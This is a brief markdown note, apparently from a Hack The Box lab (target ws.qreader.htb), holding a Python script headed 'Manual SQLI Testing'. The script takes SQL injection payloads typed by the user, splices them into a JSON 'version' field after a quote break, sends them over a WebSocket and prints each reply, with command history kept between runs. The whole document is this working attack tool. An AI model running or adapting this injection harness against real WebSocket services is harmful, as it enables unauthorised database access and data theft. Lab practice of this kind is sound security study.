# WebSockets

## Manual SQLI Testing

```
import websocket
import readline
from rich.console import Console

readline.read_history_file("sqli.history")
readline.parse_and_bind("tab: complete")
r = Console()

r.print("[+] zSockets...\n",style="bold green")
#websocket.enableTrace(True)
ws = websocket.WebSocket()
parameter = '{"version": "0\\\" PAYLOAD ;--"}'
try:
    while True:
        readline.append_history_file(100,"sqli.history")
        ws.connect("ws://ws.qreader.htb:5789/version")
        injection = input("(SQLI)>> ")
        x = parameter.replace("PAYLOAD",injection)
        ws.send(x)
        r.print(ws.recv(), style="bold blue")
        ws.close()
except (KeyboardInterrupt, EOFError):
    exit(0)
```

